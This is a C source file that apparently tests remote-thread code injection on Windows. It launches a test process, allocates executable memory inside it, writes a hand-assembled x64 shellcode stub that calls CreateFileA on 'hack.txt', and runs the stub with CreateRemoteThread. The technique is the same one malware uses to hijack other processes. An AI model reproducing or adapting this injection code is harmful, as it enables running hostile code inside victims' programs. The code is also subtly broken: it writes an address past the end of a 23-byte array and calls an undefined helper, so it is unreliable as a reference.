#include <windows.h>

int main() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)getProcessByName("memoryTestApp.exe");
    }
    
    
	PVOID pRemoteBuffer;
	pRemoteBuffer = VirtualAllocEx(process, NULL, 4096, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!pRemoteBuffer) {
        printf("injectShellcode()::VirtualAllocEx() failed: %d", GetLastError());
	}


    FARPROC addrCreateFileA = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateFileA");
    if (addrCreateFileA == NULL) {
        printf("injectShellcodeTest() failed. GetProcAddress returned NULL\n");
        goto Exit;
    }
    void* rwMemory = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (rwMemory == NULL) {
        printf("injectShellcodeTest() failed. Virtual Alloc returned NULL\n");
        goto Exit;
    }
    DWORD offset = 0;
    BYTE injectBytes[] = {
        0x41, 0xB9, 0x01, 0x00, 0x00, 0x00,
        0x45, 0x31, 0xC0,
        0x31, 0xD2,
        0x31, 0xC9,
        0x48, 0x8B, 0x04, 0x25, 0x00, 0x00, 0x00,
        0x00,
        0xFF, 0xD0
        };
    // *(DWORD*)(injectBytes + 25) = (DWORD)addrCreateFileA;
    *(DWORD64*)((PUCHAR)injectBytes + 49) = (DWORD64)(ULONG_PTR)addrCreateFileA;
    CopyMemory(((DWORD*)rwMemory + offset), injectBytes, sizeof(injectBytes));
    offset += sizeof(injectBytes);


    // UCHAR x64InfiniteLoop[] = { 0xEB, 0xFE }; // nop + jmp rel8 -2
	// CopyMemory((void*)addrEndOfShellCode, x64InfiniteLoop, sizeof(x64InfiniteLoop));
    // addrEndOfShellCode += sizeof(x64InfiniteLoop);
    
    
 
	const char nameBuf[] = "hack.txt";
	CopyMemory((void*)((DWORD64)rwMemory + offset), nameBuf, strlen(nameBuf));
    offset += strlen(nameBuf);
    
    DWORD64 lpNameInRemoteExecMemory = (DWORD64)pRemoteBuffer + offset - strlen(nameBuf);
	CopyMemory((void*)((DWORD64)rwMemory + 42), &lpNameInRemoteExecMemory, sizeof(lpNameInRemoteExecMemory));

    printf("%d, %d\n", strlen(nameBuf), sizeof(nameBuf));
    
	if (!WriteProcessMemory(process, pRemoteBuffer, rwMemory, 4096, NULL)) {
        printf("injectShellcode()::WriteProcessMemory() failed: %d", GetLastError());
    }
    
    HANDLE hRemoteThread;
    // todo: add shellcode execution
	hRemoteThread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
	if (!hRemoteThread) {
        printf("injectShellcode()::CreateRemoteThread() failed: %d", GetLastError());
	}
    

    Exit:
    system("taskkill /IM memoryTestApp.exe /F >nul");
}